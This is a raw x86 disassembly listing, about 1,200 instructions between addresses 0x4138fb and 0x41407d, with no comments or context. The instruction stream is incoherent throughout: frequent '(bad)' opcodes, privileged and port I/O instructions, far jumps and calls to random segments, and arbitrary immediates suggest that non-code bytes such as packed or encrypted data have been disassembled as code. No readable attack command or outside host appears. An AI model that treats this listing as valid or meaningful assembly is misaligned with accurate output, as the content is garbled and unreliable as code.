  4138fb:	sbb    esp,DWORD PTR [esi*2-0x202a9a4b]
  413902:	jecxz  0x4138a1
  413904:	or     al,0xed
  413906:	and    ah,dl
  413908:	cdq    
  413909:	xchg   edx,eax
  41390a:	stc    
  41390b:	pop    esi
  41390c:	push   cs
  41390d:	aad    0x31
  41390f:	pop    eax
  413910:	rcr    DWORD PTR [eax-0x7efe4bd9],1
  413916:	ret    
  413917:	shl    ah,cl
  413919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41391a:	add    BYTE PTR [esi+0x46],0x98
  41391e:	sub    dl,ch
  413920:	leave  
  413921:	dec    ebx
  413922:	inc    esp
  413923:	bound  eax,QWORD PTR [ecx+0x5014efca]
  413929:	sub    BYTE PTR [ebx+0x1],0xf3
  41392d:	and    eax,0xb4e3444
  413932:	daa    
  413933:	repnz ins BYTE PTR es:[edi],dx
  413935:	mov    ebp,0x8b0ed65
  41393a:	cmp    BYTE PTR [edi-0x6e],al
  41393d:	icebp  
  41393e:	fbld   TBYTE PTR ds:0xc2d631ec
  413944:	gs xor ah,dh
  413947:	mov    cl,0x5f
  413949:	(bad)  
  41394b:	add    BYTE PTR [esi],ch
  41394d:	fnsave [edi-0x69]
  413950:	xor    al,0xaa
  413952:	test   eax,0x65060b8f
  413957:	adc    BYTE PTR [ecx+ecx*2+0x4fcfe63a],cl
  41395e:	dec    esp
  41395f:	dec    eax
  413960:	dec    esi
  413961:	loopne 0x41399e
  413963:	xor    edi,0x7a
  413966:	jo     0x4138f8
  413968:	jmp    0x413928
  41396a:	xchg   ecx,eax
  41396b:	jmp    0x9aca36bc
  413970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413971:	push   0x64
  413973:	dec    ebx
  413974:	dec    esi
  413975:	(bad)  
  413976:	aaa    
  413977:	test   esp,eax
  413979:	dec    ecx
  41397a:	xchg   ecx,eax
  41397b:	dec    ebx
  41397c:	sbb    BYTE PTR [esi+0xca8d83a],ch
  413982:	sub    al,BYTE PTR [ebp-0x1b]
  413985:	ja     0x413925
  413987:	push   ebp
  413988:	push   edx
  413989:	mov    ecx,0xa8f73f39
  41398e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41398f:	shr    DWORD PTR [edx-0x54],1
  413992:	adc    al,0xb5
  413994:	xor    DWORD PTR [edi+0x76],esi
  413997:	push   edi
  413998:	push   0xda6dda30
  41399d:	bound  ebp,QWORD PTR [edi-0x2]
  4139a0:	ds scas eax,DWORD PTR es:[edi]
  4139a2:	jo     0x4139d8
  4139a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139a5:	sbb    eax,0xac8d0654
  4139aa:	sbb    eax,DWORD PTR [ebx+ecx*2+0x76]
  4139ae:	add    al,0x54
  4139b0:	jb     0x4139cd
  4139b2:	jp     0x4139a4
  4139b4:	nop
  4139b5:	sub    DWORD PTR [edx+0x5b4528dc],edi
  4139bb:	add    al,0xcd
  4139bd:	mov    dh,0x12
  4139bf:	jg     0x413a0b
  4139c1:	sub    BYTE PTR [ecx],dh
  4139c3:	fwait
  4139c4:	ja     0x4139dd
  4139c6:	adc    DWORD PTR [edx+0x2c67b2d0],eax
  4139cc:	push   cs
  4139cd:	aas    
  4139ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139cf:	add    ch,BYTE PTR [ebp+0x43]
  4139d2:	ficomp WORD PTR [ebp+0x27]
  4139d5:	jns    0x4139a8
  4139d7:	stos   BYTE PTR es:[edi],al
  4139d8:	mov    ch,0xe1
  4139da:	add    eax,0x45e537ce
  4139df:	xchg   ebx,eax
  4139e0:	pop    ds
  4139e1:	(bad)  
  4139e2:	cwde   
  4139e3:	outs   dx,BYTE PTR ds:[esi]
  4139e4:	iret   
  4139e5:	sbb    al,0x97
  4139e7:	les    esi,FWORD PTR [edi+0x68]
  4139ea:	add    eax,0x3fc98d8a
  4139ef:	xchg   ecx,eax
  4139f0:	xor    esp,DWORD PTR [ebx+eax*4]
  4139f3:	std    
  4139f4:	pop    eax
  4139f5:	fcomip st,st(3)
  4139f7:	(bad)  
  4139f9:	sbb    ecx,esp
  4139fb:	pusha  
  4139fc:	mov    ebx,0x5bb3aeff
  413a01:	pop    ecx
  413a02:	fld    DWORD PTR [esp+ecx*2+0x2c]
  413a06:	xor    al,0xec
  413a08:	addr16 or eax,0xd4b53409
  413a0e:	test   eax,0x9264b155
  413a13:	xchg   ebp,eax
  413a14:	int    0x7a
  413a16:	inc    ebx
  413a17:	nop
  413a18:	push   ss
  413a19:	sbb    dh,dh
  413a1b:	ror    BYTE PTR [esi+eax*8],cl
  413a1e:	sbb    eax,0xcb12063
  413a23:	sti    
  413a24:	sahf   
  413a25:	dec    esi
  413a26:	dec    ebx
  413a27:	aas    
  413a28:	adc    al,0xe5
  413a2a:	fstp   QWORD PTR [esi+0x7217c8d6]
  413a30:	test   BYTE PTR [edx],bl
  413a32:	(bad)  
  413a33:	(bad)  
  413a34:	sbb    al,0x94
  413a36:	cs stos BYTE PTR es:[edi],al
  413a38:	cmp    esi,DWORD PTR [esi-0x52]
  413a3b:	cdq    
  413a3c:	sub    ecx,DWORD PTR [edx-0x30534775]
  413a42:	jl     0x413a63
  413a44:	jae    0x413a46
  413a46:	mov    ebp,0x6135b85
  413a4b:	fiadd  WORD PTR [ebp+0x47]
  413a4e:	stos   DWORD PTR es:[edi],eax
  413a4f:	adc    dh,BYTE PTR gs:[edx+0x7e488f90]
  413a56:	mul    DWORD PTR [edx]
  413a58:	or     al,0x45
  413a5a:	ins    BYTE PTR es:[edi],dx
  413a5b:	xchg   DWORD PTR [eax-0x2d02e4f4],ecx
  413a61:	mov    ds:0xe7a85cf1,eax
  413a66:	push   0x5
  413a68:	retf   
  413a69:	xor    BYTE PTR [edx+edi*4-0x76ef4717],bl
  413a70:	cli    
  413a71:	and    cl,BYTE PTR [edx-0x6d1597f1]
  413a77:	test   DWORD PTR [edx+0x19],0x950408e5
  413a7e:	in     al,0xba
  413a80:	test   DWORD PTR [edx-0x68],esp
  413a83:	stos   DWORD PTR es:[edi],eax
  413a84:	daa    
  413a85:	in     al,dx
  413a86:	add    eax,0xd0fd2292
  413a8b:	pop    edi
  413a8c:	add    eax,0x5282a77c
  413a91:	lods   eax,DWORD PTR ds:[esi]
  413a92:	push   esp
  413a93:	mov    cl,0xda
  413a95:	inc    edx
  413a96:	jae    0x413adf
  413a98:	das    
  413a99:	jecxz  0x413ab8
  413a9b:	xchg   edi,eax
  413a9c:	fnstenv [ebp-0x15]
  413a9f:	out    dx,al
  413aa0:	jp     0x413aa3
  413aa2:	mov    WORD PTR [ebp+0x48],fs
  413aa5:	jecxz  0x413adc
  413aa7:	mov    ah,0x7b
  413aa9:	sbb    ch,dl
  413aab:	fldenv [eax+0x77]
  413aae:	dec    edx
  413aaf:	sqrtps xmm2,XMMWORD PTR [ecx]
  413ab2:	fs clc 
  413ab4:	mov    al,ds:0x1d3c8e8f
  413ab9:	mov    esi,0x3642b7a8
  413abe:	push   cs
  413abf:	xchg   BYTE PTR [edx+0x25],cl
  413ac2:	lea    edx,[esi-0xe]
  413ac5:	hlt    
  413ac6:	sbb    ebx,DWORD PTR [ebx-0x5d]
  413ac9:	addr16 xchg ecx,eax
  413acb:	neg    BYTE PTR [ebx-0x4375e9f0]
  413ad1:	or     eax,0x5db02b47
  413ad6:	mov    ah,0x1b
  413ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ad9:	ins    BYTE PTR es:[edi],dx
  413ada:	inc    edx
  413adb:	push   ss
  413adc:	jle    0x413aba
  413ade:	mov    dh,0xec
  413ae0:	or     esi,DWORD PTR [ecx+0x42]
  413ae3:	cmp    edx,DWORD PTR [ecx]
  413ae5:	test   al,0xa0
  413ae7:	rol    DWORD PTR [esi],cl
  413ae9:	inc    esi
  413aea:	push   cs
  413aeb:	xor    BYTE PTR [ebp-0x7e],ch
  413aee:	fimul  DWORD PTR [edx+esi*8-0x42668c2e]
  413af5:	inc    eax
  413af6:	loopne 0x413b36
  413af8:	leave  
  413af9:	stc    
  413afa:	rcl    edx,0xe1
  413afd:	retf   0x9680
  413b00:	cli    
  413b01:	sti    
  413b02:	cmp    dl,BYTE PTR [ebp-0x798b1743]
  413b08:	mov    dh,0x65
  413b0a:	rol    BYTE PTR [ebx],0x2
  413b0d:	cmp    DWORD PTR [eax+eiz*8],0x58
  413b11:	mov    eax,0x8efb3715
  413b16:	mov    al,0x9d
  413b18:	push   ebp
  413b19:	pop    eax
  413b1a:	jmp    0x413ad7
  413b1c:	or     edi,DWORD PTR [ecx]
  413b1e:	neg    DWORD PTR [ecx-0x3]
  413b21:	jmp    0x764e:0xc7f80b91
  413b28:	les    esi,FWORD PTR [edi+0x1f4b4bcb]
  413b2e:	in     al,dx
  413b2f:	stos   BYTE PTR es:[edi],al
  413b30:	fidiv  WORD PTR [ebp-0x16818d00]
  413b36:	or     ebx,DWORD PTR [esi+0x4fe24842]
  413b3c:	inc    ebx
  413b3d:	leave  
  413b3e:	(bad)  
  413b3f:	sub    al,0xbd
  413b41:	ficomp WORD PTR [edi+0x21710e87]
  413b47:	(bad)  
  413b48:	stc    
  413b49:	mov    ebx,DWORD PTR [edx+0x0]
  413b4c:	stc    
  413b4d:	mov    dl,0xf
  413b4f:	mov    ch,0x1b
  413b51:	xor    al,0xa6
  413b53:	and    eax,0x7e852432
  413b58:	sub    eax,0x1eaa3829
  413b5d:	cmc    
  413b5e:	sbb    edx,ebx
  413b60:	(bad)  
  413b61:	cmp    eax,0x7673c46b
  413b66:	xchg   ecx,eax
  413b67:	push   0x35676bc3
  413b6c:	inc    ecx
  413b6d:	or     dh,ah
  413b6f:	leave  
  413b70:	js     0x413afe
  413b72:	fstp   st(4)
  413b74:	xor    BYTE PTR [edi],ah
  413b76:	jp     0x413b3f
  413b78:	and    DWORD PTR [edx+0x55b23c12],0xa35fd39e
  413b82:	loope  0x413ba4
  413b84:	cmp    edi,DWORD PTR [edi]
  413b86:	(bad)  
  413b87:	(bad)
  413b8b:	out    dx,eax
  413b8c:	clc    
  413b8d:	mov    al,ds:0xd0d96757
  413b92:	mov    dl,0xa8
  413b94:	pop    ecx
  413b95:	jno    0x413b47
  413b97:	jp     0x413bec
  413b99:	xchg   DWORD PTR [eax],ebx
  413b9b:	mov    al,0xd5
  413b9d:	add    edx,eax
  413b9f:	inc    edi
  413ba0:	push   ebp
  413ba1:	mov    esi,0x9ea37edd
  413ba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ba7:	je     0x413c1e
  413ba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413baa:	mov    ds:0x2c51ffdf,al
  413baf:	mov    eax,0x996ae0d5
  413bb4:	mov    edi,0xa62fc9b6
  413bb9:	stos   BYTE PTR es:[edi],al
  413bba:	enter  0xca54,0x2
  413bbe:	ret    0x73c2
  413bc1:	or     esi,DWORD PTR [edx+0x6a]
  413bc4:	inc    edx
  413bc5:	(bad)  
  413bc6:	jmp    DWORD PTR [edx+0x4d9a52fc]
  413bcc:	jne    0x413c06
  413bce:	rol    BYTE PTR [ebx-0x66],0xeb
  413bd2:	(bad)
  413bd5:	xchg   esi,eax
  413bd6:	(bad)  
  413bd9:	push   ebx
  413bda:	pop    ss
  413bdb:	jns    0x413b64
  413bdd:	cmp    BYTE PTR [ecx-0x4e0eb239],ch
  413be3:	gs nop
  413be5:	mov    DWORD PTR [ecx+ebx*1],esi
  413be8:	and    ebx,edi
  413bea:	sbb    al,0x13
  413bec:	add    edx,DWORD PTR [esi+0x53]
  413bef:	and    al,0x27
  413bf1:	and    bh,BYTE PTR [ebx+eax*4-0x30]
  413bf5:	lahf   
  413bf6:	(bad)  
  413bf8:	mov    ah,0xfc
  413bfa:	xlat   BYTE PTR ds:[ebx]
  413bfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bfc:	call   0xe1c3:0xc9104c25
  413c03:	xlat   BYTE PTR ds:[ebx]
  413c04:	inc    ebx
  413c05:	sti    
  413c06:	mov    al,ds:0x71523dcc
  413c0b:	sub    edi,DWORD PTR [ecx-0x30]
  413c0e:	pop    edi
  413c0f:	aas    
  413c10:	outs   dx,DWORD PTR ds:[esi]
  413c11:	push   ebp
  413c12:	mov    cl,0x59
  413c14:	and    al,BYTE PTR [ebx+0x61]
  413c17:	pop    ebx
  413c18:	mov    ds:0x12e17ce6,eax
  413c1d:	ins    BYTE PTR es:[edi],dx
  413c1e:	mov    bh,0xe0
  413c20:	aad    0x92
  413c22:	mov    gs,WORD PTR [ebx+0x65]
  413c25:	adc    edi,DWORD PTR [edi+0x42dccee7]
  413c2b:	mov    eax,0x108efea1
  413c30:	mov    es,WORD PTR [ebx-0x290e0f42]
  413c36:	jae    0x413c44
  413c38:	push   edi
  413c39:	jmp    DWORD PTR [esi-0x778b435b]
  413c3f:	mov    si,WORD PTR [ecx+0x79f90bcf]
  413c46:	fld    DWORD PTR [eax]
  413c48:	and    esp,DWORD PTR [edi+0x1a]
  413c4b:	test   al,0xc8
  413c4d:	imul   ebp,DWORD PTR [esi+0x59cfab40],0xffffffdf
  413c54:	jne    0x413cd5
  413c56:	pushf  
  413c57:	imul   eax,DWORD PTR [ebx],0x4e
  413c5a:	cmp    al,0xf5
  413c5c:	xchg   ebp,eax
  413c5d:	mov    ds:0xf0bfeff0,eax
  413c62:	push   ebx
  413c63:	dec    ebx
  413c65:	lahf   
  413c66:	inc    edx
  413c67:	xor    esp,edi
  413c69:	push   ss
  413c6a:	lds    edi,FWORD PTR [esp+ebx*8-0x80]
  413c6e:	enter  0x7858,0x29
  413c72:	dec    eax
  413c73:	lahf   
  413c74:	push   ebx
  413c75:	and    eax,0xb63e51b7
  413c7a:	jnp    0x413c84
  413c7c:	jb     0x413ce4
  413c7e:	jbe    0x413cad
  413c80:	cmp    ch,BYTE PTR fs:[eax+0x5c]
  413c84:	push   ds
  413c85:	fiadd  WORD PTR [edx]
  413c87:	in     eax,0x73
  413c89:	mov    edx,DWORD PTR [ecx+0x1adccd1d]
  413c8f:	outs   dx,DWORD PTR ds:[esi]
  413c90:	call   0xcad82a3c
  413c95:	dec    ebx
  413c96:	shl    ebx,1
  413c98:	out    dx,eax
  413c99:	add    DWORD PTR [edi],0xffffff8a
  413c9c:	js     0x413c24
  413c9e:	fadd   QWORD PTR [eax+0x1]
  413ca1:	gs jnp 0x413c27
  413ca4:	out    dx,al
  413ca5:	jae    0x413cfd
  413ca7:	pop    esp
  413ca8:	add    dh,ah
  413caa:	jae    0x413cd0
  413cac:	js     0x413c63
  413cae:	ja     0x413c7d
  413cb0:	xor    eax,0xb0938fea
  413cb5:	je     0x413d0e
  413cb7:	ror    BYTE PTR [ecx],1
  413cb9:	outs   dx,BYTE PTR ds:[esi]
  413cba:	test   DWORD PTR [ebp-0x80],esp
  413cbd:	jle    0x413cb7
  413cbf:	test   DWORD PTR [esi],edi
  413cc1:	xchg   edi,eax
  413cc2:	(bad)  
  413cc3:	call   0x935e:0xe88094e3
  413cca:	xchg   esp,eax
  413ccb:	xor    eax,0x8a8a7b2c
  413cd0:	repnz (bad)
  413cd3:	call   0x9323f9d9
  413cd8:	lahf   
  413cd9:	jmp    0xf67e:0x91af2d7c
  413ce0:	pop    es
  413ce1:	inc    ecx
  413ce2:	fs in  eax,dx
  413ce4:	cwde   
  413ce5:	mov    esp,0xa9826735
  413cea:	pop    esp
  413ceb:	or     esi,DWORD PTR [ebx]
  413ced:	dec    esp
  413cee:	push   ecx
  413cef:	xor    DWORD PTR [ebx-0x3e],esi
  413cf2:	xor    dh,BYTE PTR [edx-0x9435d8c]
  413cf8:	inc    ecx
  413cf9:	aad    0x4
  413cfb:	pusha  
  413cfc:	fistp  DWORD PTR [eax]
  413cfe:	jl     0x413cc7
  413d00:	push   esp
  413d01:	push   ebp
  413d02:	push   edx
  413d03:	mov    eax,0x815b77d
  413d08:	pop    edx
  413d09:	out    0xd3,eax
  413d0b:	nop
  413d0c:	adc    DWORD PTR [eax-0x1b],esi
  413d0f:	mov    bl,0xe9
  413d11:	pop    eax
  413d12:	(bad)  
  413d14:	cmp    bh,BYTE PTR [edi+0x77]
  413d17:	stos   DWORD PTR es:[edi],eax
  413d18:	mov    ch,0xcc
  413d1a:	out    0x6b,al
  413d1c:	mov    ecx,0xa87c6e1e
  413d21:	in     eax,0xf6
  413d23:	daa    
  413d24:	test   DWORD PTR [ecx+0x67],0x9a247024
  413d2b:	xchg   esp,eax
  413d2c:	or     eax,0x74cb32ea
  413d31:	mov    ebx,0x68ebf945
  413d36:	in     al,dx
  413d37:	fsub   DWORD PTR [ecx-0x579c88f1]
  413d3d:	push   ebx
  413d3e:	jae    0x413cfc
  413d40:	push   esp
  413d41:	sbb    dl,dh
  413d43:	fdiv   DWORD PTR [edx+esi*8+0x6449c818]
  413d4a:	add    ecx,DWORD PTR [ebp-0x7562d1e0]
  413d50:	cdq    
  413d51:	bound  ebp,QWORD PTR [ecx-0x56]
  413d54:	js     0x413d38
  413d56:	cwde   
  413d57:	es js  0x413d6e
  413d5a:	ror    DWORD PTR [ebx-0x5cb2b0c5],0xc0
  413d61:	or     BYTE PTR [esi-0x6b],ah
  413d64:	push   eax
  413d65:	in     al,dx
  413d66:	sbb    eax,0x8f94c00d
  413d6b:	inc    eax
  413d6c:	cwde   
  413d6d:	sub    BYTE PTR [eax+edi*8],dh
  413d70:	mov    ch,0x5e
  413d72:	daa    
  413d73:	sahf   
  413d74:	pop    esi
  413d75:	push   ss
  413d76:	mov    bh,0xf
  413d78:	and    eax,0xd465c047
  413d7d:	sbb    bh,ch
  413d7f:	imul   edi,esi,0x32
  413d82:	push   ebp
  413d83:	nop
  413d84:	xor    edi,ebp
  413d86:	xchg   esi,eax
  413d87:	or     ebp,eax
  413d89:	fcomp  QWORD PTR [esp+edx*2+0x4f]
  413d8d:	sbb    esi,DWORD PTR [edx+0x3c]
  413d90:	add    esi,esi
  413d92:	cmp    BYTE PTR ds:0x8397856a,al
  413d98:	jae    0x413d3f
  413d9a:	push   esi
  413d9b:	push   cs
  413d9c:	dec    esp
  413d9d:	jmp    0x413d6f
  413d9f:	bound  esi,QWORD PTR [edi+eiz*1-0xe]
  413da3:	cmp    eax,0x50adca50
  413da8:	push   DWORD PTR [ebp-0x33e4fa19]
  413dae:	(bad)  
  413daf:	cmc    
  413db0:	loopne 0x413dfb
  413db2:	add    DWORD PTR [ebp+0x26546ed8],edx
  413db8:	js     0x413e2a
  413dba:	jae    0x413d8d
  413dbc:	add    al,dh
  413dbe:	xchg   edx,eax
  413dbf:	in     eax,dx
  413dc0:	and    BYTE PTR [ebp-0x67],dh
  413dc3:	and    al,0xbf
  413dc5:	sbb    bh,al
  413dc7:	rep lods al,BYTE PTR ds:[esi]
  413dc9:	push   cs
  413dca:	push   edx
  413dcb:	idiv   dh
  413dcd:	add    DWORD PTR [ecx],ebx
  413dcf:	xor    eax,DWORD PTR [edx]
  413dd1:	add    dh,BYTE PTR [ebx-0x1248f584]
  413dd7:	or     DWORD PTR [ebx],ebp
  413dd9:	or     BYTE PTR [ecx+0x30],ch
  413ddc:	sbb    al,0xf5
  413dde:	inc    edi
  413ddf:	(bad)  
  413de0:	bswap  eax
  413de2:	enter  0xc9e9,0x2
  413de6:	or     al,0xc8
  413de8:	jmp    0xa225:0xc781ba63
  413def:	push   ds
  413df0:	xchg   ecx,eax
  413df1:	cli    
  413df2:	xor    DWORD PTR [esp+ebp*4-0x5a],eax
  413df6:	stos   BYTE PTR es:[edi],al
  413df7:	xchg   esp,eax
  413df8:	dec    ebp
  413df9:	pop    edx
  413dfa:	fcomp  QWORD PTR [edx]
  413dfc:	pop    esp
  413dfd:	arpl   dx,cx
  413dff:	gs jo  0x413e4b
  413e02:	mov    ss,WORD PTR [edx-0xa29ca9]
  413e08:	xor    edi,eax
  413e0a:	cmp    BYTE PTR [eax-0x20],0xd1
  413e0e:	xchg   ebx,eax
  413e0f:	into   
  413e10:	jge    0x413e22
  413e12:	scas   al,BYTE PTR es:[edi]
  413e13:	pop    esp
  413e14:	aaa    
  413e15:	ret    0xff6c
  413e18:	jnp    0x413e62
  413e1a:	mov    bl,0x35
  413e1c:	enter  0xaa75,0xe5
  413e20:	add    eax,0x36719899
  413e25:	pop    ebx
  413e26:	icebp  
  413e27:	xchg   esi,eax
  413e28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e29:	lods   al,BYTE PTR ds:[esi]
  413e2a:	cmp    ebp,DWORD PTR [esi+0x3c2ecbff]
  413e30:	jno    0x413e65
  413e32:	aam    0xcb
  413e34:	sbb    eax,0x92266ac1
  413e39:	cmp    DWORD PTR [eax-0x37],esp
  413e3c:	jl     0x413e37
  413e3e:	in     al,dx
  413e3f:	mov    dl,0xa4
  413e41:	call   0x6e10:0x90b49e58
  413e48:	jp     0x413e5e
  413e4a:	inc    ebp
  413e4b:	test   al,0xa3
  413e4d:	cld    
  413e4e:	in     eax,0xea
  413e50:	ins    BYTE PTR es:[edi],dx
  413e51:	sbb    DWORD PTR [ebx],ebp
  413e53:	fdivr  QWORD PTR [si+0x26]
  413e57:	add    edx,DWORD PTR [eax-0x20]
  413e5a:	call   0x8bbc:0x8d131b71
  413e61:	stc    
  413e62:	ins    DWORD PTR es:[edi],dx
  413e63:	ja     0x413e52
  413e65:	jmp    0xe8edef48
  413e6a:	jnp    0x413dfc
  413e6c:	dec    edx
  413e6d:	xchg   ebx,eax
  413e6e:	in     eax,dx
  413e6f:	push   0xffffffad
  413e71:	fst    QWORD PTR [edx-0x6f]
  413e74:	aas    
  413e75:	repz fwait
  413e77:	popa   
  413e78:	xchg   ebp,eax
  413e79:	outs   dx,BYTE PTR ds:[esi]
  413e7a:	clc    
  413e7b:	outs   dx,DWORD PTR ds:[esi]
  413e7c:	mov    bl,0xa1
  413e7e:	add    eax,0x66103102
  413e83:	es loop 0x413ed4
  413e86:	pop    edx
  413e87:	xchg   esi,eax
  413e88:	or     BYTE PTR [ebx-0x6d],0xa3
  413e8c:	or     al,0xd5
  413e8e:	inc    ebp
  413e8f:	xchg   ebp,eax
  413e90:	mov    esi,DWORD PTR [edi+ebp*2+0xf]
  413e94:	dec    ecx
  413e95:	stos   DWORD PTR es:[edi],eax
  413e96:	js     0x413e8c
  413e98:	(bad)  
  413e99:	mov    edx,0x41ee70b4
  413e9e:	popf   
  413e9f:	jp     0x413eb2
  413ea1:	rcl    DWORD PTR [esp+ebx*2+0x24c048e5],cl
  413ea8:	fld    st(3)
  413eaa:	repnz pop edi
  413eac:	mov    eax,DWORD PTR [ecx-0x581bc6a5]
  413eb2:	dec    edi
  413eb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413eb4:	xchg   ebx,eax
  413eb5:	xor    al,0x8c
  413eb7:	enter  0x5914,0x31
  413ebb:	repz mov dl,BYTE PTR [eax+0x5121e8d8]
  413ec2:	dec    eax
  413ec3:	xlat   BYTE PTR ds:[ebx]
  413ec4:	shl    BYTE PTR [edi-0x5437fa43],cl
  413eca:	or     ebp,DWORD PTR [edx+0x4e]
  413ecd:	in     al,dx
  413ece:	adc    BYTE PTR [eax],ah
  413ed0:	mov    ecx,0x75cd709f
  413ed5:	ja     0x413f00
  413ed7:	push   es
  413ed8:	inc    edi
  413ed9:	cmc    
  413eda:	and    ebx,ebx
  413edc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413edd:	mov    edi,0x542a58ca
  413ee2:	jnp    0x413e95
  413ee4:	cmpsd  xmm0,QWORD PTR [ebx+0x38998384],0xd0
  413eed:	jns    0x413e7f
  413eef:	repz call 0x27b6:0xe90c9376
  413ef7:	or     al,0x8e
  413ef9:	stos   DWORD PTR es:[edi],eax
  413efa:	outs   dx,BYTE PTR ds:[esi]
  413efb:	mov    es,WORD PTR [esi-0x14]
  413efe:	xchg   BYTE PTR [eax+ecx*2-0x171af9b4],dh
  413f05:	ficom  DWORD PTR [ecx]
  413f07:	push   0x43fc918a
  413f0c:	add    eax,0x82c5d9bb
  413f11:	jns    0x413e98
  413f13:	jle    0x413ec1
  413f15:	je     0x413ed9
  413f17:	jmp    0x916e:0x7060fb19
  413f1e:	(bad)  
  413f1f:	fsub   QWORD PTR [ebx+0x1e17ce98]
  413f25:	push   edx
  413f26:	pusha  
  413f27:	mov    esi,0x2d6c877b
  413f2c:	sbb    BYTE PTR [edx],bl
  413f2e:	cmp    BYTE PTR [edx-0x2549b378],dh
  413f34:	push   esi
  413f35:	dec    esp
  413f36:	sahf   
  413f37:	sti    
  413f38:	stc    
  413f39:	outs   dx,DWORD PTR ds:[esi]
  413f3a:	leave  
  413f3b:	pop    ss
  413f3c:	rol    ebx,0x5f
  413f3f:	mov    bl,0x19
  413f41:	add    BYTE PTR [edi],cl
  413f43:	mov    eax,0x9ef6e042
  413f48:	add    cl,BYTE PTR [ebx+0x5e]
  413f4b:	and    cl,BYTE PTR [ebx]
  413f4d:	dec    DWORD PTR [ebx+0x68]
  413f50:	sub    al,0xe9
  413f52:	imul   esi,eax,0x37
  413f55:	inc    esp
  413f56:	cmp    ecx,edx
  413f58:	arpl   si,di
  413f5a:	mov    BYTE PTR [ebx],ch
  413f5c:	mov    DWORD PTR [ecx],ecx
  413f5e:	adc    BYTE PTR ds:0xec1bf581,0x31
  413f65:	push   ebp
  413f66:	push   ss
  413f67:	cdq    
  413f68:	mov    ecx,0x1fd5e26
  413f6d:	in     al,0xf4
  413f6f:	xlat   BYTE PTR ds:[ebx]
  413f70:	cld    
  413f71:	add    al,0x2
  413f73:	push   0xffffff9e
  413f75:	outs   dx,BYTE PTR ds:[esi]
  413f76:	sub    DWORD PTR [edi+0x3c],eax
  413f79:	sbb    edi,ebx
  413f7b:	(bad)  
  413f7c:	sbb    al,0x6f
  413f7e:	les    ebp,FWORD PTR ds:0x1cbec834
  413f84:	mov    eax,DWORD PTR [esi]
  413f86:	inc    edi
  413f87:	or     esp,esp
  413f89:	sbb    ebp,DWORD PTR ds:0xde015a3a
  413f8f:	shr    DWORD PTR [ebx],cl
  413f91:	or     BYTE PTR [ebp-0x4daee680],0x7d
  413f98:	jne    0x413f20
  413f9a:	inc    esp
  413f9b:	push   ebp
  413f9c:	cwde   
  413f9d:	jmp    0x413fe7
  413f9f:	mov    ds:0x1e617c49,eax
  413fa4:	bnd call 0x71698921
  413faa:	lock sub ebx,DWORD PTR [edi]
  413fad:	data16 fcom st(5)
  413fb0:	add    ebp,DWORD PTR es:[ecx]
  413fb3:	mov    dh,0xf
  413fb5:	jl     0x414018
  413fb7:	jo     0x413fb2
  413fb9:	call   DWORD PTR [ecx-0x7d051600]
  413fbf:	pop    ebp
  413fc0:	clc    
  413fc1:	ret    
  413fc2:	lds    ecx,FWORD PTR [ebp+0x4]
  413fc5:	int    0xb4
  413fc7:	and    al,0x3f
  413fc9:	dec    ebx
  413fca:	stos   BYTE PTR es:[edi],al
  413fcb:	jbe    0x413f75
  413fcd:	sub    DWORD PTR [esi+ebx*4+0x52],ebp
  413fd1:	add    eax,0x74ecf823
  413fd6:	jmp    0xeb28cf68
  413fdb:	stos   DWORD PTR es:[edi],eax
  413fdc:	xchg   ebp,eax
  413fdd:	cmp    DWORD PTR [eax-0x22],esp
  413fe0:	dec    esi
  413fe1:	arpl   WORD PTR [edi],si
  413fe3:	pop    es
  413fe4:	push   ecx
  413fe5:	or     al,0xf0
  413fe7:	or     DWORD PTR [esi+0x2f],ecx
  413fea:	add    bl,BYTE PTR [ebp-0x55]
  413fed:	retf   
  413fee:	cwde   
  413fef:	pop    ebp
  413ff0:	mov    ds:0x18f3c3e,eax
  413ff5:	jbe    0x41405f
  413ff7:	fist   WORD PTR [esi-0x7cdac1e7]
  413ffd:	jle    0x41402d
  413fff:	jmp    0x9a19c792
  414004:	sbb    esp,DWORD PTR [edi-0x53]
  414007:	and    edi,DWORD PTR [ecx+0x10]
  41400a:	imul   ecx,ecx,0xffffffe5
  41400d:	mov    al,ds:0xe0f8b150
  414012:	mov    DWORD PTR [edi],esp
  414014:	dec    ebp
  414015:	stc    
  414016:	xchg   esi,eax
  414017:	mov    dh,0x1e
  414019:	loop   0x413fcc
  41401b:	or     bl,ah
  41401d:	gs jmp 0x1ecdcd9f
  414023:	cdq    
  414024:	push   ds
  414025:	shr    BYTE PTR [eax+0xf],1
  414028:	enter  0xe934,0x28
  41402c:	jno    0x414098
  41402e:	or     BYTE PTR [ebp+eiz*1+0x2050c1d8],ah
  414035:	jb     0x414091
  414037:	or     al,0x23
  414039:	cld    
  41403a:	and    al,0x68
  41403c:	rol    bh,0x6b
  41403f:	mov    dl,0xe2
  414041:	int    0xba
  414043:	dec    ebx
  414044:	test   al,0xef
  414046:	mov    bl,0xe4
  414048:	ins    BYTE PTR es:[edi],dx
  414049:	int    0xd3
  41404b:	ss adc eax,0x46800a84
  414051:	pusha  
  414052:	mov    al,0x9
  414054:	pop    ebx
  414055:	or     al,0x23
  414057:	fwait
  414058:	add    al,BYTE PTR [ebx]
  41405a:	push   esp
  41405b:	dec    esi
  41405c:	xlat   BYTE PTR ds:[ebx]
  41405d:	xor    al,0x52
  41405f:	fidiv  WORD PTR [ebp+0x51]
  414062:	push   es
  414063:	jno    0x4140cc
  414065:	jl     0x41407e
  414067:	jmp    FWORD PTR [ebp+0x6d60ac6e]
  41406d:	inc    ebx
  41406e:	adc    al,0xd2
  414070:	mov    bh,0x2f
  414072:	jmp    0x582a6163
  414077:	stos   BYTE PTR es:[edi],al
  414078:	push   ds
  414079:	push   edi
  41407a:	adc    DWORD PTR [ebx-0x61],ecx
  41407d:	mov    cl,BYTE PTR [edx]
